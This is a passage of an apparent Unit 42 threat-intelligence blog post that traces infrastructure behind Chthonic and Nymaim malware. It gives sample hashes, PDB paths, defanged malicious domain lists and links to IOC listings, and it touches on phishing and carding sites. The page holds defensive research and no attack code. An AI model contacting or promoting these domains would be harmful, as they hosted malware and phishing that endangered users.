<td width="172">5785c2d68d6f669b96c3f31065f0d9804d2ab1f333a90d225bd993e66656b7d9</td>
<td width="93">2017-08-07 12</td>
<td width="178">C:\Lgisys\hypothesized\donatedc.pdb</td>
</tr>
<tr>
<td width="172">675719a9366386034c285e99bf33a1a8bafc7644874b758f307d9a288e95bdbd</td>
<td width="93">2017-08-07 17</td>
<td width="178">C:\work\cr\nata\cpp\seven\seven\release\seven.pdb</td>
</tr>
</tbody>
</table>
<p>At least one of the binaries compiled in August had a PDB string I was able to locate online in a collection of other PDB files, so they may be introducing their malicious code into these files before compiling someone else’s project.</p>
<p>Once the file has been downloaded and executed, the new process will launch a legitimate executable, such as “msiexec.exe”, and inject code into it. This code will then download further payloads through a POST request to various websites. This pattern is shared across the original samples.</p>
<p><img class="alignnone size-full wp-image-40225" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_005.png" alt="cht_005" width="883" height="529" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_005.png 883w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_005-300x180.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_005-768x460.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_005-370x222.png 370w" sizes="(max-width: 883px) 100vw, 883px" /></p>
<p>These HTTP requests match known patterns for a banking Trojan named Chthonic, which is a variant of Zeus. A good write-up from 2014 on the malware can be found in this writeup from Yury Namestnikov, Vladimir Kuskov, Oleg Kupreev at Kaspersky Lab <a href="https://securelist.com/chthonic-a-new-modification-of-zeus/68176/">here</a> and indicates that the returned data is an RC4 encrypted loader that sets-up the main Chthonic module which can download additional modules or malware.</p>
<h3>A dab of Nymaim</h3>
<p>Iterating once again over the 171 samples and scraping out the HTTP POST requests, I ended up with the below set of domains.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac4780d284398821" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
amellet[.]bit
danrnysvp[.]com
ejtmjealr[.]com
firop[.]com
gefinsioje[.]com
gesofgamd[.]com
ponedobla[.]bit
unoset[.]com</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac4780d284398821-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac4780d284398821-2">2</div><div class="crayon-num" data-line="crayon-5f694cac4780d284398821-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac4780d284398821-4">4</div><div class="crayon-num" data-line="crayon-5f694cac4780d284398821-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac4780d284398821-6">6</div><div class="crayon-num" data-line="crayon-5f694cac4780d284398821-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac4780d284398821-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac4780d284398821-1"><span class="crayon-v">amellet</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">bit</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac4780d284398821-2"><span class="crayon-v">danrnysvp</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-5f694cac4780d284398821-3"><span class="crayon-v">ejtmjealr</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac4780d284398821-4"><span class="crayon-v">firop</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-5f694cac4780d284398821-5"><span class="crayon-v">gefinsioje</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac4780d284398821-6"><span class="crayon-v">gesofgamd</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-5f694cac4780d284398821-7"><span class="crayon-v">ponedobla</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">bit</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac4780d284398821-8"><span class="crayon-v">unoset</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">com</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Using this as the next pivot, we have 6,034 unique samples that get returned in AutoFocus having made POST requests to these sites. Additionally, we can see there were at least 3 very large campaigns where Palo Alto Networks saw activity to these sites in July.<br />
<img class="alignnone size-full wp-image-40201" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_006.png" alt="cht_006" width="505" height="196" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_006.png 505w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_006-300x116.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_006-370x144.png 370w" sizes="(max-width: 505px) 100vw, 505px" /></p>
<p>From these distribution sites, we can see that 5,520 samples are making HTTP requests to them and these samples have been identified as another downloader Trojan named Nymaim.</p>
<p>The majority of the overall samples came from the following four sites.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac47813979943447" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
ejtmjealr[.]com
gefinsioje[.]com
gesofgamd[.]com
ponedobla[.]bit</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac47813979943447-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47813979943447-2">2</div><div class="crayon-num" data-line="crayon-5f694cac47813979943447-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47813979943447-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac47813979943447-1"><span class="crayon-v">ejtmjealr</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47813979943447-2"><span class="crayon-v">gefinsioje</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-5f694cac47813979943447-3"><span class="crayon-v">gesofgamd</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">com</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47813979943447-4"><span class="crayon-v">ponedobla</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">bit</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The ‘ejtmjealr[.]com’ domain is particularly interesting due to a similar domain, ‘ejdqzkd[.]com’ being discussed by Jarosław Jedynak of CERT.PL in this <a href="https://www.cert.pl/en/news/single/nymaim-revisited/">analysis of Nymaim</a> from earlier in the year. They go on to discuss how Nymaim uses a static configuration to contact that domain, which will return IP’s that go into a DGA and output the actual IP addresses needed for C2 communication. Ben Baker, Edmund Brumaghin and Jonah Samost of Talos have a fantastic write-up of this process <a href="http://blog.talosintelligence.com/2016/09/goznym.html">here</a>.</p>
<p><span style="color: inherit; font-family: inherit; font-size: 24px;">Raising the dead – Infrastructure Archeology</span></p>
<p>To continue my analysis, I shifted focus to Maltego so as to visually graph the infrastructure. For this task, I used PassiveTotal’s Passive DNS and <a href="https://live.paloaltonetworks.com/t5/Maltego-for-AutoFocus/ct-p/AutoFocus_Maltego">AutoFocus Maltego</a> transforms. We see below the passive resolutions for these domains and how it reveals a number of IP addresses being shared between the four domains identified above.</p>
<p><img class="alignnone size-full wp-image-40177" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_007.png" alt="cht_007" width="813" height="542" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_007.png 813w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_007-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_007-768x512.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_007-370x247.png 370w" sizes="(max-width: 813px) 100vw, 813px" /></p>
<p>All of the 707 IP addresses can be found <a href="https://github.com/pan-unit42/iocs/blob/master/notepadcase/IP_listing.txt">here</a>. Note that while these IP’s have been found to be hosting malicious content, this could change in the future.</p>
<p>Pivoting off the five highlighted IP’s above with a shared infrastructure, I pulled the reverse DNS to see what other sites may be present. The below is a sampling of the domains returned through this process.</p>
<p><img class="alignnone size-full wp-image-40153" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_008.png" alt="cht_008" width="610" height="356" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_008.png 610w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_008-300x175.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_008-370x216.png 370w" sizes="(max-width: 610px) 100vw, 610px" /></p>
<p>The “idXXXXX.top” pattern immediately stands out and may suggest a pattern in the static configuration for the initial domains used by the DGA for Nymaim since the previous two started with “ejX.com.</p>
<p>Given the level of overlap already, I proceeded to grab all of the passive DNS available for each of the 707 IP addresses. A full list of the domains can be seen <a href="https://github.com/pan-unit42/iocs/blob/master/notepadcase/Domain_listing.txt">here</a>. The below Maltego graph is used to simply illustrate the two distinct clusters of infrastructure that appeared and their interconnectedness.</p>
<p><img class="alignnone size-full wp-image-40129" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_010.png" alt="cht_010" width="742" height="465" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_010.png 742w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_010-300x188.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_010-370x232.png 370w" sizes="(max-width: 742px) 100vw, 742px" /></p>
<p>From the first cluster on the left, if we sort by incoming links per node a pattern stands out in the domain names looking similar to the previously mentioned Nymaim ones. In the below image, the top domains are sorted by incoming links on the right side. Each link is a corresponding IP address and show that these domains have been rotated quite a bit between the infrastructure.</p>
<p><img class="alignnone size-full wp-image-40105" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_011.png" alt="cht_011" width="302" height="303" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_011.png 302w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_011-150x150.png 150w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_011-300x300.png 300w" sizes="(max-width: 302px) 100vw, 302px" /></p>
<p>A quick search with the AutoFocus transform to pull tag information shows these are specifically related to Nymaim, most likely for the DGA seed; however, looking at domains with less links, other malware families begin to emerge.</p>
<p>The cluster on the right is actually collapsing one collection of entities due to the sheer size of it. Below is the collection expanded in all of its glory.</p>
<p><img class="alignnone size-full wp-image-39889" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_012.png" alt="cht_012" width="524" height="499" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_012.png 524w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_012-300x286.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_012-370x352.png 370w" sizes="(max-width: 524px) 100vw, 524px" /></p>
<p>Below are the domain names linked to the singular IP address in the center.</p>
<p><img class="alignnone size-full wp-image-39865" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_021.png" alt="cht_021" width="489" height="500" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_021.png 489w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_021-293x300.png 293w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_021-370x378.png 370w" sizes="(max-width: 489px) 100vw, 489px" /></p>
<p>All of these connected domains follow a pattern similar to phishing attacks masquerading as legitimate services – in this case “online.verify[.]paypal” (588) and “hmrc.secure[.]refund” (1021).</p>
<p>In addition to domains of that type, there is evidence of other malware distribution being carried out on this infrastructure. Collapsing the collection back down, note the two domains “brontorittoozzo[.]com” and “randomessstioprottoy[.]net” that fall outside of the collection due to more infrastructure connections.</p>
<p><img class="alignnone size-full wp-image-40081" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_013.png" alt="cht_013" width="645" height="374" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_013.png 645w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_013-300x174.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_013-370x215.png 370w" sizes="(max-width: 645px) 100vw, 645px" /></p>
<p>A quick search for these domains will land you on fellow Unit 42 researcher <a href="https://researchcenter.paloaltonetworks.com/author/bduncan/">Brad Duncan</a>’s malware-traffic-analysis (MTA) site for post “<a href="http://www.malware-traffic-analysis.net/2017/06/22/index.html">2017-06-22 &#8211; LOCKY MALSPAM &#8211; PDF ATTACHMENTS WITH EMBEDDED .DOCM FILES</a>” in which he lists out URL’s found within malicious Microsoft Word documents that download Locky as shown below.</p>
<p><img class="alignnone size-full wp-image-40057" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014.png" alt="cht_014" width="1042" height="856" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014.png 1042w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014-900x739.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014-300x246.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014-768x631.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014-1024x841.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_014-370x304.png 370w" sizes="(max-width: 1042px) 100vw, 1042px" /></p>
<p>In some of the other smaller clusters, you’ll find groupings of like malicious sites.</p>
<p>For example, there is a group with gems like “premarket[.]ws” like you see below being hosted on this shared infrastructure, which is a forum for less than legal services.</p>
<p><img class="alignnone size-full wp-image-40033" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_015.png" alt="cht_015" width="586" height="738" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_015.png 586w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_015-238x300.png 238w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_015-370x466.png 370w" sizes="(max-width: 586px) 100vw, 586px" /></p>
<p>Along with sites like “slilpp[.]ws” which is another less than reputable site as shown below.</p>
<p><img class="alignnone size-full wp-image-39961" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018.png" alt="cht_018" width="1228" height="786" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018.png 1228w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018-900x576.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018-300x192.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018-768x492.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018-1024x655.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_018-370x237.png 370w" sizes="(max-width: 1228px) 100vw, 1228px" /></p>
<p>Which ironically has a Twitter support account that specifically states the following.</p>
<p><img class="alignnone size-full wp-image-39937" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019.png" alt="cht_019" width="1164" height="204" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019.png 1164w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019-900x158.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019-300x53.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019-768x135.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019-1024x179.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_019-370x65.png 370w" sizes="(max-width: 1164px) 100vw, 1164px" /></p>
<p>And yet another here below…</p>
<p><img class="alignnone size-full wp-image-39913" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020.png" alt="cht_020" width="1840" height="702" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020.png 1840w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020-900x343.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020-300x114.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020-768x293.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020-1024x391.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_020-370x141.png 370w" sizes="(max-width: 1840px) 100vw, 1840px" /></p>
<p>There are 632 people happily following along with relatively easy to track down accounts and usernames. A substantial amount of these accounts, on quick review, appear to follow the <a href="https://researchcenter.paloaltonetworks.com/2016/11/unit42-nigerian-prince-evolved-game/">typical Nigerian cybercrime patterns</a> detailed in other blogs.</p>
<p>Finally, there were multiple clusters of domains used by the Hancitor malware dropper to host the initial check-in and tracking as shown here.</p>
<p><img class="alignnone size-full wp-image-40009" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_016.png" alt="cht_016" width="653" height="464" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_016.png 653w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_016-300x213.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_016-370x263.png 370w" sizes="(max-width: 653px) 100vw, 653px" /></p>
<p>Which can be seen as having been used in a campaign on July 03, 2017 via a post on <a href="http://www.malware-traffic-analysis.net/2017/07/03/index.html">MTA</a> below.</p>
<p><img class="alignnone size-full wp-image-39985" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017.png" alt="cht_017" width="1204" height="374" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017.png 1204w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017-900x280.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017-300x93.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017-768x239.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017-1024x318.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_017-370x115.png 370w" sizes="(max-width: 1204px) 100vw, 1204px" /></p>
<h3>Conclusion</h3>
<p>By pivoting off of one sample we were able to zoom out and identify a sizable infrastructure of what appears to be <a href="https://github.com/pan-unit42/iocs/tree/master/notepadcase">707 IP’s and 2,611 domains</a> being utilized for malicious activity.</p>
<p>As such, these findings represent a collection of compromised websites, compromised registrar accounts used to spin up subdomains, domains used by malware DGA’s, phishing kits, carding forums, malware C2 sites, and a slew of other domains that revolve around criminal activity.</p>
<p>Hopefully this analysis has been helpful in understanding how truly connected some of these infrastructures can be and how with a little digging, you can uncover a substantial amount of operationally useful indicators to protect you and yours.</p>
<p>AutoFocus users can identify and track these threats using the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Chthonic">Chthonic</a>, Nymaim, and NotepadInfrastructure tags.</p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

